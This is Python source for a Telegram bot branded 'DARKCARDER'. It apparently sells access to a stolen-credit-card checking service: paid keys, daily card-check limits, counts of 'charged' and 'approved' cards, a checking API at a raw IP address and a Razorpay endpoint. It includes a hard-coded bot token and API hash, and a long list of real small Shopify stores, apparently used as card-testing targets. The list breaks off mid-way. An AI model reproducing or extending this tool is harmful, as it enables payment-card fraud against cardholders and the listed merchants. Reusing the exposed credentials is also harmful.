from telethon.tl.functions.channels import GetParticipantRequest
from telethon.errors import UserNotParticipantError
from telethon import TelegramClient, events, Button
import asyncio
import aiohttp
import aiofiles
import os
import random
import time
import re
import json
import secrets
import string
from datetime import datetime, timedelta
from telethon.errors import FloodWaitError
from PIL import Image, ImageDraw, ImageFont
from aiohttp_socks import ProxyConnector
import pytz
import sqlite3

# ============================================================
# 🎬 START VIDEO — set this to your Telegram file_id after first run
# On first run the bot will download t.me/eshxresources/2 and cache the file_id
# ============================================================
START_VIDEO_ID = None          # populated at runtime after first send
START_VIDEO_SOURCE_CHAT = "eshxresources"
START_VIDEO_SOURCE_MSG  = 2

# ============================================================
# 🎌 HIT ANIME GIF — free Giphy public beta key (rate limited but works)
# Searches: samurai anime aesthetic 16:9 animated
# ============================================================
GIPHY_API_KEY = "dc6zaTOxFJmzC"   # Giphy public/demo key
GIPHY_TAGS    = ["cute anime girl", "anime kawaii", "chibi anime", "anime cozy", "anime aesthetic cute"]
_gif_cache: list = []

async def fetch_random_anime_gif() -> str | None:
    """Return a Giphy GIF URL (mp4 or gif). Falls back to None on error."""
    global _gif_cache
    try:
        if _gif_cache:
            return _gif_cache.pop(random.randint(0, len(_gif_cache)-1))
        tag = random.choice(GIPHY_TAGS)
        url = (
            f"https://api.giphy.com/v1/gifs/search"
            f"?api_key={GIPHY_API_KEY}&q={tag.replace(' ', '+')}"
            f"&limit=20&rating=g&lang=en"
        )
        async with aiohttp.ClientSession() as s:
            async with s.get(url, timeout=aiohttp.ClientTimeout(total=8)) as r:
                if r.status != 200:
                    return None
                data = await r.json()
        for item in data.get("data", []):
            mp4 = item.get("images", {}).get("original_mp4", {}).get("mp4")
            if mp4:
                _gif_cache.append(mp4)
        if _gif_cache:
            return _gif_cache.pop()
    except Exception:
        pass
    return None

async def send_anime_hit_gif(chat_id: int):
    """Send an anime GIF alongside a hit — fire-and-forget."""
    try:
        gif_url = await fetch_random_anime_gif()
        if not gif_url:
            return
        async with aiohttp.ClientSession() as s:
            async with s.get(gif_url, timeout=aiohttp.ClientTimeout(total=15)) as r:
                if r.status != 200:
                    return
                data = await r.read()
        import tempfile, os as _os
        with tempfile.NamedTemporaryFile(suffix=".mp4", delete=False) as tmp:
            tmp.write(data)
            tmp_path = tmp.name
        try:
            await bot.send_file(chat_id, tmp_path, video_note=False, supports_streaming=True)
        finally:
            try:
                _os.remove(tmp_path)
            except Exception:
                pass
    except Exception as e:
        print(f"[anime gif] {e}")

# ============================================================
# 🎬 START VIDEO HELPER
# ============================================================
async def send_start_video(chat_id, caption, buttons):
    """Send the start menu with video. Caches file_id after first forward."""
    global START_VIDEO_ID
    try:
        if START_VIDEO_ID:
            await bot.send_file(
                chat_id,
                file=START_VIDEO_ID,
                caption=caption,
                buttons=buttons,
                parse_mode="html",
            )
            return
        # First time: forward from source channel to get file_id
        msg = await bot.get_messages(START_VIDEO_SOURCE_CHAT, ids=START_VIDEO_SOURCE_MSG)
        if msg and msg.media:
            sent = await bot.send_file(
                chat_id,
                file=msg.media,
                caption=caption,
                buttons=buttons,
                parse_mode="html",
            )
            START_VIDEO_ID = sent.media.document.id if sent.media else None
        else:
            # fallback: text only
            await bot.send_message(chat_id, caption, buttons=buttons, parse_mode="html")
    except Exception as e:
        print(f"[video] {e}")
        try:
            await bot.send_message(chat_id, caption, buttons=buttons, parse_mode="html")
        except Exception:
            pass

# ============================================================
# 🔥 PREMIUM EMOJI
# ============================================================
PREMIUM_EMOJI_IDS = {
    "✅": "6298612102709909362",
    "❌": "5440681540541502133",
    "⚡": "6026367225466720832",
    "💠": "5971837723676249096",
    "⏸️": "6001440193058444284",
    "▶️": "6285315214673975495",
    "🌚": "6298678524379137990",
    "📊": "5971837723676249096",
    "📦": "6066395745139824604",
    "📋": "5974235702701853774",
    "🔄": "5971837723676249096",
    "⏳": "5971837723676249096",
    "🚀": "6282977077427702833",
    "⚠️": "5420323339723881652",
    "💎": "5427168083074628963",
    "🔥": "5267500801240092311",
    "💰": "6190336264940559752",
    "🤩": "6267091732861555879",
    "✔️": "6206479140040743133",
    "⭐": "5267500801240092311",
    "💳": "5800709991627232190",
    "🏧": "4967738760021148319",
    "🔗": "4958689671950369798",
    "🫥": "5325731315004218660",
    "⏱": "5382194935057372936",
    "⚡️": "5042334757040423886",
    "👑": "5039727497143387500",
    "☄️": "5373026167722876606",
    "👤": "5431815452437257407",
    "💬": "5373089862327261204",
    "ℹ️": "5372981901407516758",
    "🛒": "5373141891733564160",
    "🔑": "5373171491090181079",
    "📢": "5373016304850395136",
    "👥": "5373048951948104601",
    "🎀": "5373171560207577996",
    "🌸": "5373044790080019474",
    "✨": "5368324170671202286",
    "🎯": "5373168528048570263",
    "🏆": "5373141739189530877",
}

def premium_emoji(text):
    if not text:
        return text
    placeholders = []
    result = text
    for i, (emoji, doc_id) in enumerate(PREMIUM_EMOJI_IDS.items()):
        placeholder = f"\x00PE{i:02d}\x00"
        placeholders.append((placeholder, doc_id, emoji))
        result = result.replace(emoji, placeholder)
    for placeholder, doc_id, emoji in placeholders:
        result = result.replace(placeholder, f'<tg-emoji emoji-id="{doc_id}">{emoji}</tg-emoji>')
    return result

# ============================================================
# 🔥 API CONFIG
# ============================================================
API_MAP = {
    "api1": "http://5.175.140.23:5001/shopify",
}

# ============================================================
# API HEALTH — skip dead Railway deploys ("Application not found")
# ============================================================
API_HEALTH = {k: {"fails": 0, "dead_until": 0.0} for k in API_MAP}
API_HEALTH_LOCK = asyncio.Lock()
API_DEAD_COOLDOWN = 300  # seconds to skip a host after repeated Application-not-found

async def mark_api_fail(api_url: str, reason: str = ""):
    """Bump fail count; cool down host if it looks permanently dead."""
    reason_l = (reason or "").lower()
    hard = any(x in reason_l for x in (
        "application not found", "application_not_found", "deploy not found",
        "404", "no application", "not found"
    ))
    async with API_HEALTH_LOCK:
        for k, u in API_MAP.items():
            if u == api_url or api_url.startswith(u):
                h = API_HEALTH[k]
                h["fails"] += 1
                if hard or h["fails"] >= 2:
                    h["dead_until"] = time.time() + API_DEAD_COOLDOWN
                    h["fails"] = 0
                break

async def mark_api_ok(api_url: str):
    async with API_HEALTH_LOCK:
        for k, u in API_MAP.items():
            if u == api_url or api_url.startswith(u):
                API_HEALTH[k]["fails"] = 0
                API_HEALTH[k]["dead_until"] = 0.0
                break

def get_api():
    """Pick a random API host that is not in cooldown."""
    now = time.time()
    alive = []
    for k, u in API_MAP.items():
        h = API_HEALTH.get(k, {})
        if h.get("dead_until", 0) <= now:
            alive.append(u)
    if not alive:
        # all cooling — use everything, reset soft
        alive = list(API_MAP.values())
    return random.choice(alive)



# ============================================================
# BOT CONFIG — DARKCARDER
# ============================================================
API_ID = 34392279
API_HASH = '79deab91ba4c2642677f04a0d0e74bd2'
BOT_TOKEN = '8982610472:AAH4TBnKWjUk_VHRMOJ1DuKgjn9vOZ_Ce_w'   # ← change if you have new token
ADMIN_ID = 8189708860
KEY_ADMINS = {8189708860}
OWNER_USERNAME = "iam_eshh"
OWNER_NAME = "ᴇ ꜱ ʜ ᥫ᭡"
CHANNEL_LINK = "https://t.me/+a_Zh1YV6C4E5ZTY1"
GROUP_LINK = "https://t.me/hilexxhits"
CHANNEL_USERNAME = "hilexxhits"          # for join check (adjust if private)
BOT_NAME = "ʜ ᴇ ʟ ᴇ x メ"
KEY_PREFIX = "ʜ ᴇ ʟ ᴇ x メ"

PREMIUM_FILE = 'premium.txt'
SITES_FILE = 'sites.txt'
MULTI_KEYS_FILE = 'multi_device_keys.json'
PROXY_FILE = 'proxy.txt'
VERIFIED_FILE = "verified_users.txt"
USER_SITES_FILE = 'user_sites.json'
USER_PROXY_FILE = 'user_proxies.json'
KEYS_FILE = "keys.txt"
BLOCK_FILE = "blocked_users.txt"
DAILY_USAGE_FILE = "daily_usage.json"
FEEDBACK_FILE = "feedback.json"
STATS_FILE = "bot_stats.json"
RZ_SITES_FILE = 'rz_sites.txt'
PHOTO_URL = "https://i.ibb.co/WpyJdGrz/1785498072504.png"

bot = TelegramClient('darkcarder_bot', API_ID, API_HASH).start(bot_token=BOT_TOKEN)

RAZORPAY_FIXED_SITE = "https://pages.razorpay.com/BusinessGarh?fbclid=PAAaYBPBDRDVaPZMu7kXaq1a2mNOIiXxEJ1usxIxxdbAJYt3q75QWhHXFZeh8_aem_AXQuIpg6pqBI2mXplIaDgYU0ztY4jF0C97qV1RPZF6WzfWeZy93K9u0Gv1wbTWYDpRs%20Ye%20lagan%20he%20to/pl_Eg24W0HLznkELl/view"
RAZORPAY_API_BASE = "https://temprazopay.up.railway.app/"

last_click = {}
active_sessions = {}
user_check_locks = {}
user_feedback_state = {}

# ============================================================
# HELPERS
# ============================================================
async def send_to_chat(chat_id, text, **kwargs):
    try:
        await bot.send_message(chat_id, text, **kwargs)
    except FloodWaitError as e:
        await asyncio.sleep(e.seconds)
        await bot.send_message(chat_id, text, **kwargs)
    except Exception:
        try:
            await bot.send_message(chat_id, text, **kwargs)
        except:
            pass

def load_json(path, default=None):
    if default is None:
        default = {}
    try:
        with open(path, "r", encoding="utf-8") as f:
            return json.load(f)
    except:
        return default

def save_json(path, data):
    with open(path, "w", encoding="utf-8") as f:
        json.dump(data, f, indent=2)

def get_indian_time():
    return datetime.now(pytz.timezone('Asia/Kolkata')).strftime("%I:%M:%S %p IST")

def get_full_indian_time():
    return datetime.now(pytz.timezone('Asia/Kolkata')).strftime("%d %b %Y • %I:%M %p IST")

# ============================================================
# STATS
# ============================================================
def load_stats():
    return load_json(STATS_FILE, {
        "total_checks": 0,
        "total_charged": 0,
        "total_approved": 0,
        "total_dead": 0,
        "total_users": 0,
        "total_feedback": 0,
        "last_updated": get_full_indian_time()
    })

def update_stats(**kwargs):
    stats = load_stats()
    for k, v in kwargs.items():
        if k in stats:
            stats[k] = stats.get(k, 0) + v
    stats["last_updated"] = get_full_indian_time()
    save_json(STATS_FILE, stats)

# ============================================================
# FEEDBACK
# ============================================================
def load_feedback():
    return load_json(FEEDBACK_FILE, [])

def save_feedback(data):
    save_json(FEEDBACK_FILE, data)

def add_feedback(user_id, username, text, rating=None):
    data = load_feedback()
    entry = {
        "user_id": user_id,
        "username": username,
        "text": text,
        "rating": rating,
        "time": get_full_indian_time()
    }
    data.append(entry)
    save_feedback(data)
    update_stats(total_feedback=1)
    return entry

# ============================================================
# PREMIUM / ADMIN / BLOCK
# ============================================================
def is_admin(user_id):
    return user_id == ADMIN_ID or user_id in KEY_ADMINS

def is_premium(user_id):
    if not os.path.exists(PREMIUM_FILE):
        return False
    valid = []
    found = False
    user_id_str = str(user_id)
    try:
        with open(PREMIUM_FILE, "r", encoding='utf-8') as f:
            for line in f:
                line = line.strip()
                if not line:
                    continue
                try:
                    uid, exp_str = line.split("|", 1)
                    exp_str = exp_str.strip()
                    if ":" in exp_str:
                        exp = datetime.strptime(exp_str, "%Y-%m-%d %H:%M:%S")
                    else:
                        exp = datetime.strptime(exp_str, "%Y-%m-%d")
                        exp = exp.replace(hour=23, minute=59, second=59)
                    if exp > datetime.now():
                        valid.append(line)
                        if uid == user_id_str:
                            found = True
                except:
                    pass
        with open(PREMIUM_FILE, "w", encoding='utf-8') as f:
            f.write("\n".join(valid) + ("\n" if valid else ""))
    except:
        return False
    return found

def is_blocked(user_id):
    try:
        with open(BLOCK_FILE, "r") as f:
            return str(user_id) in f.read().splitlines()
    except:
        return False

def block_user(user_id):
    if not is_blocked(user_id):
        with open(BLOCK_FILE, "a") as f:
            f.write(f"{user_id}\n")

def unblock_user(user_id):
    if is_blocked(user_id):
        blocked = [x for x in open(BLOCK_FILE).read().splitlines() if x != str(user_id)]
        with open(BLOCK_FILE, "w") as f:
            f.write("\n".join(blocked) + ("\n" if blocked else ""))

def get_blocked_users():
    try:
        return open(BLOCK_FILE).read().splitlines()
    except:
        return []

# ============================================================
# KEYS — DARKCARDER PREFIX
# ============================================================
def load_keys():
    return load_json(MULTI_KEYS_FILE, {})

def save_keys(keys):
    save_json(MULTI_KEYS_FILE, keys)

def generate_multi_device_key(days, device_limit):
    random_part = ''.join(secrets.choice(string.ascii_uppercase + string.digits) for _ in range(6))
    key = f"{KEY_PREFIX}-MULTI-{random_part}-{days}D-{device_limit}U"
    keys = load_keys()
    keys[key] = {
        "days": days,
        "device_limit": device_limit,
        "used": 0,
        "users": [],
        "created": get_full_indian_time(),
        "active": True
    }
    save_keys(keys)
    return key

def generate_key(days):
    key = f"{KEY_PREFIX}-{random.randint(100000,999999)}-{days}D"
    with open(KEYS_FILE, 'a', encoding='utf-8') as f:
        f.write(f"{key}|{days}\n")
    return key

def redeem_key(key, user_id):
    if not os.path.exists(KEYS_FILE):
        return "invalid"
    try:
        with open(KEYS_FILE, "r", encoding='utf-8') as f:
            lines = f.readlines()
        new_lines = []
        found = False
        for line in lines:
            line = line.strip()
            if not line:
                continue
            try:
                k, d = line.split("|", 1)
                if k.strip().upper() == key.strip().upper():
                    found = True
                    expiry_days = 99999 if is_admin(user_id) else int(d.strip())
                    expiry = datetime.now(pytz.timezone('Asia/Kolkata')) + timedelta(days=expiry_days)
                    with open(PREMIUM_FILE, "a", encoding='utf-8') as p:
                        p.write(f"{user_id}|{expiry.strftime('%Y-%m-%d %H:%M:%S')}\n")
                else:
                    new_lines.append(line + "\n")
            except:
                new_lines.append(line + "\n")
        if not found:
            return "invalid"
        with open(KEYS_FILE, "w", encoding='utf-8') as f:
            f.writelines(new_lines)
        return "success"
    except:
        return "invalid"

def redeem_multi_device_key(key, user_id):
    keys = load_keys()
    if key not in keys:
        return "invalid"
    key_data = keys[key]
    if not key_data.get("active", False):
        return "invalid"
    if str(user_id) in key_data.get("users", []):
        return "used"
    if is_premium(user_id) or is_admin(user_id):
        return "already_premium"
    if key_data["used"] >= key_data["device_limit"]:
        return "device_limit_reached"
    key_data["used"] += 1
    key_data["users"].append(str(user_id))
    if key_data["used"] >= key_data["device_limit"]:
        key_data["active"] = False
    save_keys(keys)
    days = key_data["days"]
    expiry = (datetime.now(pytz.timezone('Asia/Kolkata')) + timedelta(days=days)).strftime("%Y-%m-%d %H:%M:%S")
    with open(PREMIUM_FILE, "a") as f:
        f.write(f"{user_id}|{expiry}\n")
    return "success"

# ============================================================
# DAILY USAGE
# ============================================================
def get_daily_usage(user_id):
    data = load_json(DAILY_USAGE_FILE, {})
    today = datetime.now(pytz.timezone('Asia/Kolkata')).date().isoformat()
    if str(user_id) not in data or data[str(user_id)].get("date") != today:
        data[str(user_id)] = {"cc_count": 0, "date": today}
        save_json(DAILY_USAGE_FILE, data)
    return data[str(user_id)]

def update_daily_usage(user_id, cc_count=1):
    data = load_json(DAILY_USAGE_FILE, {})
    today = datetime.now(pytz.timezone('Asia/Kolkata')).date().isoformat()
    if str(user_id) not in data or data[str(user_id)].get("date") != today:
        data[str(user_id)] = {"cc_count": 0, "date": today}
    data[str(user_id)]["cc_count"] += cc_count
    save_json(DAILY_USAGE_FILE, data)

def check_limits(user_id, is_bulk=False):
    if is_admin(user_id) or is_premium(user_id):
        return True, 999999
    usage = get_daily_usage(user_id)
    if is_bulk:
        return usage["cc_count"] < 3000, 3000 - usage["cc_count"]
    return usage["cc_count"] < 150, 150 - usage["cc_count"]

# ============================================================
# SITES / PROXIES
# ============================================================
SHOPIFY_FIXED_SITES = [
    "https://kingdomcomecards.com",
    "https://stencilrevolution.com",
    "https://double-hh-thrifty.myshopify.com",
    "https://tsmshop.com",
    "https://stoneridgebooks.com",
    "https://auracrystals.com",
    "https://ripnroll.com",
    "https://tadashi-walker-sr.myshopify.com",
    "https://customframesolutions.com",
    "https://citikitty.com",
    "https://getneroball.com",
    "https://spotteddogcompany.com",
    "https://2nd-impressions-upscale-thrift-store.myshopify.com",
    "https://1-call-home-supply.myshopify.com",
    "https://orbaudio.com",
    "https://beyondhype.com",
    "https://boatcarpetbuys.com",
    "https://askunclejack.com",
    "https://second-life-atlanta.myshopify.com",
    "https://risebar.com",
    "https://elittledirect.myshopify.com",
    "https://outdoorvitals.com",
    "https://fortworthfabricstudio.myshopify.com",
    "https://filastruder.com",
    "https://www.thepaintedporch.com",
    "https://gallagherelectricfencing.com",
    "https://lliked.myshopify.com",
    "https://illuminatedbymia.myshopify.com",
    "https://detroitgrooming.com",
    "https://blackhelmetapparel.com",
    "https://bkbooks.com",
    "https://www.plei.shop",
    "https://krecs.com",
    "https://caputron.com",
    "https://doctorqs.myshopify.com",
    "https://anthroverse.myshopify.com",
    "https://magneticjewelrysupply.myshopify.com",
    "https://youre-on-the-money.myshopify.com",
    "https://mooreaseal.com",
    "https://gravity-razors.myshopify.com",
    "https://punisher.myshopify.com",
    "https://signal-vault.com",
    "https://carnivorousplantnursery.com",
    "https://technogears.tlji.com",
    "https://www.vicegripgarage.com",
    "https://nirvana-aviation.myshopify.com",
    "https://cora.life",
    "https://e50e4a.myshopify.com",
    "https://allbirds.com",
    "https://nickelandsuede.com",
    "https://cruzlabel.com",
    "https://stirlingsoap.com",
    "https://tubshroom.com",
    "https://fitleticsports.myshopify.com",
    "https://deeringbanjos.com",
    "https://blackrockcreationsus.myshopify.com",
    "https://mrkate.com",
    "https://www.kiwihen.com",
    "https://www.singlesswag.com",
    "https://bionyoillustrations.com",
    "https://beclickless.com",
    "https://threadcutterz.com",
    "https://aervana.com",
    "https://tektel.com",
    "https://velo-orange.com",
    "https://leannrimesstore.com",
    "https://rockpaperscissorsshop.com",
    "https://untamedego.com",
    "https://www.threadcutterz.com",
    "https://wandrd.com",
    "https://dwarvenforge.com",
    "https://wild-berry.com",
    "https://accentpaddles.com",
    "https://wqwf.myshopify.com",
    "https://txhumor.com",
    "https://vrd-retail.myshopify.com",
    "https://power-calls.myshopify.com",
    "https://zefiro-chicago.myshopify.com",
    "https://bendsoap.com",
    "https://thegreenpepper.com",
    "https://nerdwax.com",
    "https://the-candle-box.myshopify.com",
    "https://fishandsave.myshopify.com",
    "https://primrosecottage.myshopify.com",
    "https://easternbikes.com",
    "https://gen5-diy.myshopify.com",
    "https://anseladams.org",
    "https://st-marks-episcopal-church-school.myshopify.com",
    "https://ecbrandz.myshopify.com",
    "https://strongcoffeecompany.com",
    "https://mark-santa-maria.myshopify.com",
    "https://safesleevecases.com",
    "https://north-sun-3.myshopify.com",
    "https://paperieplanning.com",
    "https://rockymounts.com",
    "https://murichiles.com",
    "https://jaxndaisy.com",
    "https://blade-tech.com",
    "https://marlondoleather.com",
    "https://violettestickers.com",
    "https://www.bearwallowherbs.com",
    "https://timewarpboulder.com",
    "https://thefloramodiste.com",
    "https://atomstudios.com",
    "https://tokenjewelry.com",
    "https://yallsweettea.com",
    "https://castagaintackle.com",
    "https://detailersociety.com",
    "https://littlethingsstudio.com",
    "https://samarabags.com",
    "https://mood.design",
    "https://shop.hooters.com",
    "https://lacebread.com",
    "https://shop.spam.com",
    "https://goodkinsmen.com",
    "https://dynamome.myshopify.com",
    "https://upliftprovisionsco.com",
    "https://passionworks.org",
    "https://bucksspices.com",
    "https://expressionmed.com",
    "https://oddbirdgifts.com",
    "https://childsplaybooks.myshopify.com",
    "https://www.bioseaweedgel.com",
    "https://rangeleyflyshop.com",
    "https://www.carnivalsource.com",
    "https://ddir.store",
    "https://melrosegraphicsco.com",
    "https://merch.outlawbeer.com",
    "https://hellfighters.myshopify.com",
    "https://challengecoinnation.com",
    "https://evlolash.com",
    "https://deltacowebstore.com",
    "https://scorenn.com",
    "https://islandbookstore.com",
    "https://lincolncitygifts.com",
    "https://simbihaiti.com",
    "https://pacificparadiseprints.shop",
    "https://www.bountifulbaby.com",
    "https://www.simplyelegantchaircovers.com",
    "https://siennasauceco.com",
    "https://boxedgreens.com",
    "https://soavefaire.com",
    "https://www.retrowaviest.com",
    "https://trycloudy.com",
    "https://chandler.studio",
    "https://www.aris-designs.com",
    "https://jasonwubeauty.com",
    "https://barbiz-boutique.myshopify.com",
    "https://lebzone.com",
    "https://svensmash.com",
    "https://store.kittyhawk.com",
    "https://www.wandwjewelers.com",
    "https://brickmini.com",
    "https://goldanddiamond.com",
    "https://www.bigagnes.com",
    "https://sugarnspiceartworks.myshopify.com",
    "https://simpleelegancejewelry.com",
    "https://shopgug.com",
    "https://popup-kids.myshopify.com",
    "https://www.bigbluedive.com",
    "https://stagecoach-boutique.myshopify.com",
    "https://myjukebox.com",
    "https://www.rhodypepper.com",
    "https://southlacafe.myshopify.com",
    "https://www.brownsugarbabe.net",
    "https://affordableturf.us",
    "https://dev-goodybeads.myshopify.com",
    "https://www.teamblonde.com",
    "https://www.deloasquiltshop.com",
    "https://dgmaxwax.com",
    "https://worldflagsdirect.com",
    "https://www.mytopicals.com",
    "https://www.baofengradio.com",
    "https://jpidisplay.myshopify.com",
    "https://southern-anchor-ky.myshopify.com",
    "https://lastobject.com",
    "https://www.hiproof.com",
    "https://shopsketch.com",
    "https://tiefossi.com",
    "https://shop.cuyamabuckhorn.com",
    "https://knlzdesigns.com",
    "https://woodenspooldesigns.com",
    "https://www.jlab.com",
    "https://cutelittlefabricshop.com",
    "https://www.nativecos.com",
    "https://www.deepthoughtsdesigns.com",
    "https://www.brickemyoung.com",
    "https://bookhockingpackages.com",
    "https://www.scottrohlfs.com",
    "https://trscare.org",
    "https://mydocumentedlife.net",
    "https://drinkhoist.com",
    "https://northandfinch.com",
    "https://numberonelaboratory.com",
    "https://nellitascraft.com",
    "https://kitchencrop.com",
    "https://codaskateboards.com",
    "https://figureocho.com",
    "https://www.pearsonranchjerky.com",
    "https://dr-delicia-md.myshopify.com",
    "https://holiday-lights.myshopify.com",
    "https://davids-toothpaste.myshopify.com",
    "https://cookie-cutter-lady.myshopify.com",
    "https://boardgametables.myshopify.com",
    "https://projectk9hero.myshopify.com",
    "https://asti-professional-hair-color-care.myshopify.com",
    "https://catchamerica.com",
    "https://smitten-on-paper.myshopify.com",
    "https://www.pugliepug.com",
    "https://super-tots.com",
    "https://hazellovespie.com",
    "https://panicfabrications.com",
    "https://evandesigns.myshopify.com",
    "https://motosox.com",
    "https://laughingwomancraftsandsupplies.com",
    "https://greatergoodsroasting.com",
    "https://realcleanproducts.myshopify.com",
    "https://www.pensandpencils.net",
    "https://kinkbmx.com",
    "https://healingherbalsoups.com",
    "https://hoppybunnyshop.com",
    "https://goldenmoontea.com",
    "https://usamilitarymedals.com",
    "https://www.thepaperquillingshop.com",
    "https://healthworkssafety.net",
    "https://www.kartboy.com",
    "https://gupshupgreetings.com",
    "https://relax-n-wax-llc.myshopify.com",
    "https://www.storysupplyco.com",
    "https://national-shrine-of-st-dymphna.myshopify.com",
    "https://andreashields.com",
    "https://wilderess.com",
    "https://westernweartexas.com",
    "https://brickemyoung.com",
    "https://mtdfe.com",
    "https://bluemoonemporium.com",
    "https://national-shrine-of-saint-rita-of-cascia.myshopify.com",
    "https://shopify.cncrawford.com",
    "https://cowsandcrayons.com",
    "https://flagsforgood.com",
    "https://www.stasskincare.com",
    "https://shop.simon.com",
    "https://coolify.torraslife.com",
    "https://moverandshakerco.com",
    "https://mynebeauty.com",
    "https://shop.chakakhan.com",
    "https://edelweisspost.com",
    "https://thriveecosystems.com",
    "https://slicklocks.com",
    "https://spokaneartsupply.com",
    "https://creaturecoffee.co",
    "https://seamtecglobal.com",
    "https://www.fitzwrightfire.com",
    "https://sheilastotts.com",
    "https://jpgamingusa.com",
    "https://urbansouthern.com",
    "https://sterling-ink.com",
    "https://papierplume.com",
    "https://www.biotechbeautyus.com",
    "https://mbsexpendables.com",
    "https://billdanceoutdoors.com",
    "https://blankbeauty.com",
    "https://kidsrideshotgun.com",
    "https://johnsonspopcorn.com",
    "https://www.daviandbar.com",
    "https://survival-gear-and-products.myshopify.com",
    "https://sirensistersboutique.com",
    "https://rainbowloom.com",
    "https://beverlinhills.com",
    "https://darkacediscgolf.com",
    "https://www.stashtea.com",
    "https://whatifcreations.com",
    "https://katiewhitedesigns.store",
    "https://pinwheelclay.com",
    "https://shopcrescentcityclay.com",
    "https://kaldikollective.com",
    "https://clayandfernco.com",
    "https://www.skincarebylaurens.com",
    "https://theclayfulco.com",
    "https://apolovers.com",
    "https://ivylenashop.com",
    "https://shopsphandmade.com",
    "https://redleavesstudio.com",
    "https://annemjewelry.com",
    "https://madecutters.com",
    "https://virauful.com",
    "https://coconutbarrel.com",
    "https://meadowandmae.com",
    "https://trailform.com",
    "https://www.adrianamariadesigns.com",
    "https://lasalbafv.com",
    "https://hipsterandco.com",
    "https://coronadobrewing.com",
    "https://hanncraftedgoods.com",
    "https://six16creative.com",
    "https://irkpa.org",
    "https://breannaellevoldart.com",
    "https://noelleearrings.com",
    "https://soulriotus.myshopify.com",
    "https://michelebuschjewelry.com",
    "https://twentyfourbtq.com",
    "https://www.stickerfab.com",
    "https://theosider.com",
    "https://www.sanjosemade.com",
    "https://shopashleighmckoy.com",
    "https://stickerpickle.com",
    "https://claybydenae.com",
    "https://vyoletshop.com",
    "https://jordanvalleydesigns.com",
    "https://shop.caninestars.org",
    "https://ivyandpearlboutique.com",
    "https://relishbrand.com",
    "https://armstrongoutpost.com",
    "https://graciousgobbler.com",
    "https://minomino.art",
    "https://www.rusticheirloom.com",
    "https://vinyldisorder.com",
    "https://shopmtw.com",
    "https://florawestdesign.com",
    "https://www.shopisabellerose.com",
    "https://paperbloom.com",
    "https://brissonte.com",
    "https://www.fillupbuttercup.com",
    "https://fuzzyloondesigns.com",
    "https://3sonsfoods.com",
    "https://creationmusiccompany.com",
    "https://dingall.com",
    "https://polarfilament.com",
    "https://www.bolderbon.com",
    "https://gratiadesignco.com",
    "https://millerbeesupply.com",
    "https://griffinpockettool.com",
    "https://simplylightdesigns.com",
    "https://chloesgiantcookies.com",
    "https://www.performance-pcs.com",
    "https://shoprevivaldesignco.com",
    "https://order.sandttoo.com",
    "https://shop.iyasumehawaii.com",
    "https://www.malie.com",
    "https://mavalus.com",
    "https://warriorswayjerky.com",
    "https://simplyelegantchaircovers.com",
    "https://allsaintssisters.myshopify.com",
    "https://cansonic.com",
    "https://www.bettyjanecandies.com",
    "https://earvolution.com",
    "https://shop.windchillultimate.com",
    "https://brookfarmgeneralstore.com",
    "https://hallmarkscrapbook.com",
    "https://fitzwrightfire.com",
    "https://homesteadbrand.com",
    "https://four-seasons-of-happiness.myshopify.com",
    "https://store.rmrkblty.org",
    "https://i55bookfairs.com",
    "https://junkfoodarcades.com",
    "https://funscreations.com",
    "https://the-mammoth-site.myshopify.com",
    "https://carnivalsource.com",
    "https://proferred.tools",
    "https://shophouseofprim.com",
    "https://shop.fidoalliance.org",
    "https://atsmcraft.com",
    "https://shoporlandopride.com",
    "https://roysrockets.com",
    "https://arkansas-outdoor-power-equipment.myshopify.com",
    "https://offthewagon.myshopify.com",
    "https://ultra-violet-5452.myshopify.com",
    "https://alpenglowsupply.com",
    "https://shopwhoi.myshopify.com",
    "https://aaavacuumofallon.com",
    "https://electro-smith.com",
    "https://sugly.net",
    "https://gracelaced.com",
    "https://cleetusmcfarland.com",
    "https://moretoloveasheville.com",
    "https://creaproducts-inc.myshopify.com",
    "https://zombieclawpolish.com",
    "https://us.foursigmatic.com",
    "https://flomask.com",
    "https://mcdougalldesigns3d.com",
    "https://bagito.co",
    "https://carlisleprintz.myshopify.com",
    "https://kixies.com",
    "https://052794dadadg.myshopify.com",
    "https://beautybakerie.com",
    "https://westsixthonlinestore.com",
    "https://antstores.com",
    "https://danaateoatmeal.com",
    "https://lilmonkeyboutique.com",
    "https://allways99pr.com",
    "https://locallatherok.com",
    "https://joliespartyshop.com",
    "https://letswalkdog.com",
    "https://jealousdevilshop.com",
    "https://ast-emerald-boutique.myshopify.com",
    "https://erinbakers.myshopify.com",
    "https://whereyoubean.co",
    "https://payless4lighting.myshopify.com",
    "https://omasofficial.com",
    "https://shelf-co.com",
    "https://bitetoothpastebits.com",
    "https://deloasquiltshop.com",
    "https://22kill.myshopify.com",
    "https://wilderness-collective.myshopify.com",
    "https://feedingpickleltd.com",
    "https://carryproof.com",
    "https://spacegasboards.myshopify.com",
    "https://artpop.com",
    "https://bountifulbaby.com",
    "https://cleanyourdirtyface.shop",
    "https://sunnydayco.com",
    "https://getquip.com",
    "https://plei.shop",
    "https://storymakersnyc.com",
    "https://laudatacoma.com",
    "https://thepaintedporch.com",
    "https://hovdenwear.com",
    "https://shop.bushbeans.com",
    "https://fox40shopusa.com",
    "https://ingoodfun.co",
    "https://rustypaperscissors.com",
    "https://dangerousbutgood.com",
    "https://hookedonpickin.com",
    "https://airplanthub.com",
    "https://aprimitiveplacemagazine.com",
    "https://fazendacoffee.com",
    "https://huntsvillecityfcshop.com",
    "https://store.nols.edu",
    "https://jake-and-shelby.myshopify.com",
    "https://lonezscents.com",
    "https://demeritwear.com",
    "https://naturallclub.com",
    "https://millergirlcandleco.com",
    "https://onenycshop.com",
    "https://tutenago.com",
    "https://heybuddyheypal.com",
    "https://www.beautybakerie.com",
    "https://meowmeowtweet.com",
    "https://www.lunchskins.com",
    "https://bebemoss.com",
    "https://melodylicious.myshopify.com",
    "https://www.allways99pr.com",
    "https://cocofloss.com",
    "https://bekahworleyco.com",
    "https://www.southlacafe.com",
    "https://eastwoodawards.com",
    "https://cheesecapitaloftheworld.com",
    "https://rebadgedesign.com",
    "https://bcmini.com",
    "https://oroborostore.com",
    "https://switchesim.com",
    "https://www.allmixeduplacquers.com",
    "https://www.oldstatefarms.com",
    "https://utmprinting.com",
    "https://blacktopmojo.com",
    "https://happyhentreats.com",
    "https://buysomecoffee.com",
    "https://www.datagnss.com",
    "https://toothpod.co",
    "https://spacefoxcoffee.com",
    "https://ninjakidz.shop",
    "https://shop.chastity.com",
    "https://mosaicmoose.net",
    "https://cafemam.com",
    "https://fulfilledgoods.com",
    "https://athriftynotion.com",
    "https://kamikaze-collection.store",
    "https://apiarioguare.com",
